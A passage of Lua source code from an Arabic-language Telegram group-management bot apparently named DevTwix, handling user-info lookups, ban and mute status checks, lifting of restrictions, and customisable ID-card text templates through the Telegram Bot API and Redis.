local user_nkt = tonumber(DevHmD:get(DevTwix..'HmD:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevHmD:sismember(DevTwix..'HmD:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevHmD:sismember(DevTwix..'HmD:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevHmD:sismember(DevTwix..'HmD:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevHmD:sismember(DevTwix..'HmD:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n⋄︙القيود » '..Tkeed
else 
Tked = '' 
end
if DevHmD:sismember(DevTwix..'HmD:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n⋄︙عدد الكروبات : '..(DevHmD:get(DevTwix..'HmD:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\n⋄︙لقبه : '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⋄︙اسمه : ['..data.first_name_..'](tg://user?id='..result.sender_user_id_..')\n⋄︙ايديه : `'..result.sender_user_id_..'`\n⋄︙رتبته : '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n⋄︙رسائله : '..user_msgs..'\n⋄︙تفاعله : '..formsgs(user_msgs)..CustomTitle..'\n⋄︙نقاطه : '..user_nkt..' '..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙معرفه : [@'..data.username_..']\n⋄︙ايديه : `'..result.sender_user_id_..'`\n⋄︙رتبته : '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n⋄︙رسائله : '..user_msgs..'\n⋄︙تفاعله : '..formsgs(user_msgs)..CustomTitle..'\n⋄︙نقاطه : '..user_nkt..' '..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and ChCheck(msg) or text and text:match('^ايدي @(.*)') and ChCheck(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙*المعرف غير صحيح*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '⋄︙نوع الحساب : '..ch..' ❩\n⋄︙الايدي : `'..res.id_..'`\n⋄︙المعرف : [@'..username..']\n⋄︙الاسم : ['..res.title_..']'
Dev_HmD(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '⋄︙نوع الحساب : '..gr..'\n⋄︙الايدي : '..res.id_..'\n⋄︙المعرف : [@'..username..']\n⋄︙الاسم : ['..res.title_..'] '
Dev_HmD(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = DevHmD:get(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevHmD:get(DevTwix..'HmD:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevHmD:sismember(DevTwix..'HmD:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevHmD:sismember(DevTwix..'HmD:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevHmD:sismember(DevTwix..'HmD:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevHmD:sismember(DevTwix..'HmD:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n⋄︙القيود » '..Tkeed
else 
Tked = '' 
end
if DevHmD:sismember(DevTwix..'HmD:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n⋄︙عدد الكروبات » '..(DevHmD:get(DevTwix..'HmD:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\n⋄︙لقبه : '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙الحساب محذوف', 1, 'md')
return false  end
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙*معرفه:* [@'..data.username_..']\n⋄︙*ايديه : *`'..res.id_..'`\n⋄︙*رتبته : '..IdRank(res.id_, msg.chat_id_)..sudobot..'\n⋄︙رسائله : '..user_msgs..'\n⋄︙تفاعله : '..formsgs(user_msgs)..CustomTitle..'\n⋄︙نقاطه : '..user_nkt..'*'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and ChCheck(msg) or text and text:match('ايدي (%d+)') and ChCheck(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لم يتم التعرف على الحساب', 1, 'md')
return false  
end
local user_msgs = DevHmD:get(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevHmD:get(DevTwix..'HmD:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevHmD:sismember(DevTwix..'HmD:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevHmD:sismember(DevTwix..'HmD:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevHmD:sismember(DevTwix..'HmD:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevHmD:sismember(DevTwix..'HmD:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n⋄︙القيود : '..Tkeed
else 
Tked = '' 
end
if DevHmD:sismember(DevTwix..'HmD:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n⋄︙عدد الكروبات » '..(DevHmD:get(DevTwix..'HmD:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
CustomTitle = '\n⋄︙لقبه » '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⋄︙*اسمه : *['..data.first_name_..'](tg://user?id='..iduser..')\n⋄︙*ايديه : *`'..iduser..'`*\n⋄︙رتبته : '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n⋄︙رسائله : '..user_msgs..'\n⋄︙تفاعله : '..formsgs(user_msgs)..CustomTitle..'\n⋄︙نقاطه : '..user_nkt..'*'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙معرفه : [@'..data.username_..']\n⋄︙ايديه : `'..iduser..'`\n⋄︙رتبته : '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n⋄︙رسائله : '..user_msgs..'\n⋄︙تفاعله : '..formsgs(user_msgs)..CustomTitle..'\n⋄︙نقاطه : '..user_nkt..' '..Tked, 1, 'md')
end
end,nil)
return false 
end 
---------------------------------------------------------------------------------------
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevHmD:sismember(DevTwix..'HmD:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevHmD:sismember(DevTwix..'HmD:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevHmD:sismember(DevTwix..'HmD:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevHmD:sismember(DevTwix..'HmD:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*الحظر العام » '..banall..'\n⋄︙الكتم العام » '..muteall..'\n⋄︙الحظر » '..banned..'\n⋄︙الكتم » '..muted..'\n⋄︙التقيد » *'..tkeed, 1,'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevHmD:sismember(DevTwix..'HmD:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevHmD:sismember(DevTwix..'HmD:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevHmD:sismember(DevTwix..'HmD:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevHmD:sismember(DevTwix..'HmD:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*الحظر العام » '..banall..'\n⋄︙الكتم العام » '..muteall..'\n⋄︙الحظر » '..banned..'\n⋄︙الكتم » '..muted..'\n⋄︙التقيد » *'..tkeed, 1, 'md')  
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevHmD:srem(DevTwix..'HmD:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevHmD:srem(DevTwix..'HmD:Ban:'..msg.chat_id_,result.sender_user_id_) DevHmD:srem(DevTwix..'HmD:Muted:'..msg.chat_id_,result.sender_user_id_) DevHmD:srem(DevTwix..'HmD:BanAll:',result.sender_user_id_) DevHmD:srem(DevTwix..'HmD:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevHmD:srem(DevTwix..'HmD:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevHmD:srem(DevTwix..'HmD:Ban:'..msg.chat_id_,result.sender_user_id_) DevHmD:srem(DevTwix..'HmD:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"Reply","⋄︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevHmD:srem(DevTwix..'HmD:Tkeed:'..msg.chat_id_,user) DevHmD:srem(DevTwix..'HmD:Ban:'..msg.chat_id_,user) DevHmD:srem(DevTwix..'HmD:Muted:'..msg.chat_id_,user) DevHmD:srem(DevTwix..'HmD:BanAll:',user) DevHmD:srem(DevTwix..'HmD:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevHmD:srem(DevTwix..'HmD:Tkeed:'..msg.chat_id_,user) DevHmD:srem(DevTwix..'HmD:Ban:'..msg.chat_id_,user) DevHmD:srem(DevTwix..'HmD:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevHmD:srem(DevTwix..'HmD:Tkeed:'..msg.chat_id_,result.id_) DevHmD:srem(DevTwix..'HmD:Ban:'..msg.chat_id_,result.id_) DevHmD:srem(DevTwix..'HmD:Muted:'..msg.chat_id_,result.id_) DevHmD:srem(DevTwix..'HmD:BanAll:',result.id_) DevHmD:srem(DevTwix..'HmD:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevHmD:srem(DevTwix..'HmD:Tkeed:'..msg.chat_id_,result.id_) DevHmD:srem(DevTwix..'HmD:Ban:'..msg.chat_id_,result.id_) DevHmD:srem(DevTwix..'HmD:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
---------------------------------------------------------------------------------------
if Manager(msg) then
if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
local List = {
[[
⋄︙Msgs : #msgs .
⋄︙ID : #id .
⋄︙Stast : #stast .
⋄︙UserName : #username .
]],
[[
˛ َ𝖴ᥱ᥉ : #username  .
˛ َ𝖲𝗍ُɑِ  : #stast   . 
˛ َ𝖨ժ : #id  .
˛ َ𝖬⁪⁬⁮᥉𝗀ِ : #msgs   .
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏
• 🖤 | 𝑺𝑻𝑨 : #stast 
• 🖤 | 𝑰𝑫 : #id ‌‌‏
• 🖤 | 𝑴𝑺𝑮 : #msgs
]],
[[
⋄︙𝖬𝗌𝗀𝗌 : #msgs  .
⋄︙𝖨𝖣 : #id  .
⋄︙𝖲𝗍𝖺𝗌𝗍 : #stast .
⋄︙𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 : #username .
]],
[[
⌁ Use ⇨{#username} 
⌁ Msg⇨ {#msgs} 
⌁ Sta ⇨ {#stast} 
⌁ iD ⇨{#id} 
▿▿▿
]],
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
▹ 𝙐SE𝙍 𖨄 #username  𖤾.
▹ 𝙈𝙎𝙂 𖨄 #msgs  𖤾.
▹ 𝙎𝙏?? 𖨄 #stast  𖤾.
▹ 𝙄𝘿 𖨄 #id 𖤾.
]],
[[
➼ : 𝐼𝐷 𖠀 #id
➼ : 𝑈𝑆𝐸𝑅 𖠀 #username
➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs
➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast
➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
୫ 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➤ #username
୫ 𝙈𝙀𝙎𝙎𝘼𝙂𝙀𝙎 ➤ #msgs
୫ 𝙎𝙏𝘼𝙏𝙎 ➤ #stast
୫ 𝙄𝘿 ➤ #id
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇮🇶- #id 
𝐔𝐬𝐞𝐫𝐍𝐚☤🇮🇶- #username 
𝐒𝐭𝐚𝐬𝐓 ☤🇮🇶- #stast 
𝐌𝐬𝐠𝐒☤🇮🇶 - #msgs
]],
[[
≈ 𝒖𝒔𝒆 √ #username '
≈ 𝒎𝒔𝒈 √ #msgs '
≈ 𝒔𝒕𝒂 √ #stast '
≈ 𝒊𝒅 √ #id '
≈ 𝒆𝒅𝒊𝒕 √ #edit '
]],
[[
𖣯 𝕀𝔻 🇮🇶⃤᷂ #id
𖣯 𝕌𝕊𝔼ℝ 🇮🇶⃤᷂ #username
𖣯 𝕄𝕊𝔾  🇮🇶⃤᷂ #msgs
𖣯 𝕊𝕋𝔸𝕋𝔼 🇮🇶⃤᷂ #stast
𖣯 𝔼𝔻𝕀𝕋 🇮🇶⃤᷂ #edit
]],
[[
° 𝖘𝖙𝖆 : #stast ـ
 ° 𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ
 °  𝖒𝖘𝖌𝖘 : #msgs ـ
 ° 𝖎𝖉 : #id ـ
]],
[[
.𓄌 : 𝖴𝖲𝖤𝖱 . #username
.𓄌 : 𝖬𝖲𝖦 . #msgs
.𓄌 : 𝖲𝖳𝖠 . #stast
.𓄌 : 𝖨𝖣 . #id
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game  
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]]}
local Text_Rand = List[math.random(#List)]
DevHmD:set(DevTwix.."HmD:GpIds:Text"..msg.chat_id_,Text_Rand)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم تغير كليشة الايدي")  
end
---------------------------------------------------------------------------------------
if SecondSudo(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^× تعين الايدي عام ×$") then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙رجائا اتبع التعليمات للتعيين \n⋄︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه » \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n `#username` ⇠ لطبع المعرف\n `#id` ⇠ لطبع الايدي \n `#photos` ⇠ لطبع عدد الصور \n `#stast` ⇠ لطبع الرتب \n `#msgs` ⇠ لطبع عدد الرسائل \n `#msgday` ⇠ لطبع الرسائل اليوميه \n `#CustomTitle` ⇠ لطبع اللقب \n `#bio` ⇠ لطبع البايو \n `#auto` ⇠ لطبع التفاعل \n `#game` ⇠ لطبع عدد النقاط \n `#cont` ⇠ لطبع عدد الجهات \n `#edit` ⇠ لطبع عدد السحكات \n `#Description` ⇠ لطبع تعليق الصور\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••', 1, 'md')
DevHmD:set("DevTwix:New:id:"..DevTwix..msg.sender_user_id_,'DevTwixTeam')
return "DevTwixTeam"
end
if text and DevHmD:get("DevTwix:New:id:"..DevTwix..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevHmD:del("DevTwix:New:id:"..DevTwix..msg.sender_user_id_)
return false
end
DevHmD:del("DevTwix:New:id:"..DevTwix..msg.sender_user_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevHmD:set(DevTwix.."HmD:AllIds:Text",text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^× مسح الايدي العام ×$") or text and text:match("^حذف كليشة الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف كليشة الايدي العامه")  
DevHmD:del(DevTwix.."HmD:AllIds:Text")
end
end
---------------------------------------------------------------------------------------
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙رجائا اتبع التعليمات للتعيين \n⋄︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه » \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n `#username` ⇠ لطبع المعرف\n `#id` ⇠ لطبع الايدي \n `#photos` ⇠ لطبع عدد الصور \n `#stast` ⇠ لطبع الرتب \n `#msgs` ⇠ لطبع عدد الرسائل \n `#msgday` ⇠ لطبع الرسائل اليوميه \n `#CustomTitle` ⇠ لطبع اللقب \n `#bio` ⇠ لطبع البايو \n `#auto` ⇠ لطبع التفاعل \n `#game` ⇠ لطبع عدد النقاط \n `#cont` ⇠ لطبع عدد الجهات \n `#edit` ⇠ لطبع عدد السحكات \n `#Description` ⇠ لطبع تعليق الصور\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••', 1, 'md')
DevHmD:set("DevTwix:New:id:"..DevTwix..msg.chat_id_..msg.sender_user_id_,'DevTwixTeam')
return "DevTwixTeam"
end
if text and Manager(msg) and DevHmD:get("DevTwix:New:id:"..DevTwix..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevHmD:del("DevTwix:New:id:"..DevTwix..msg.chat_id_..msg.sender_user_id_)
return false
end
DevHmD:del("DevTwix:New:id:"..DevTwix..msg.chat_id_..msg.sender_user_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حفظ الكليشه الجديده', 1, 'md')
DevHmD:set(DevTwix.."HmD:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف كليشة الايدي")  
DevHmD:del(DevTwix.."HmD:GpIds:Text"..msg.chat_id_)
end
end
---------------------------------------------------------------------------------------
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function DevTwixTeam(extra,HmD,success)
if HmD.username_ then username = '@'..HmD.username_ else username = 'لا يوجد' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'لا يوجد' end
local function getpro(extra, HmD, success) 
local msgsday = DevHmD:get(DevTwix..'HmD:UsersMsgs'..DevTwix..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevHmD:get(DevTwix..'HmD:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevHmD:get(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevHmD:get(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevHmD:get(DevTwix..'HmD:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevHmD:get(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {
'صورتك فدشي 😘😔❤️',
"حلغوم والله☹️ ",
"اطلق صوره🐼❤️",
"وفالله 😔💘",
"كشخه برب 😉💘",
"ئمنورني يا وردة 🤣💝",
"كشخه يمعلم 😉💘",
"كرشت يحلو 🙊😘",
"عمري الحلوين 🥲🦋",
"مو بشر حلغوم 🙊😘",
"فديت الصاك محح 🙊",
"فـدشـي عمـي 😙❤️",
"شهل گـيمـر 😉❤️",
"فديت الحلو 🙈💋",
}
local Description = Texting[math.random(#Texting)]
if HmD.photos_[0] then
if not DevHmD:get(DevTwix..'HmD:Lock:Id'..msg.chat_id_) then 
if not DevHmD:get(DevTwix..'HmD:Lock:Id:Photo'..msg.chat_id_) then 
if DevHmD:get(DevTwix.."HmD:AllIds:Text") then
newpicid = DevHmD:get(DevTwix.."HmD:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#photos',(HmD.total_count_ or 'لا يوجد')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'لا يوجد'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
newpicid = newpicid:gsub('#cont',(cont or 'لا يوجد'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
else
newpicid = "⋄︙"..Description.."\n⋄︙معرفك :"..username.."\n⋄︙ايديك : "..msg.sender_user_id_.."\n⋄︙رتبتك : "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⋄︙رسائلك : "..user_msgs.."\n⋄︙تعديلاتك : "..edit_msg.."\n⋄︙تفاعلك : "..formsgs(msguser).."\n⋄︙نقاطك : "..user_nkt.."\n"
end 
if not DevHmD:get(DevTwix.."HmD:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, HmD.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevHmD:get(DevTwix.."HmD:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(HmD.total_count_ or '')) 
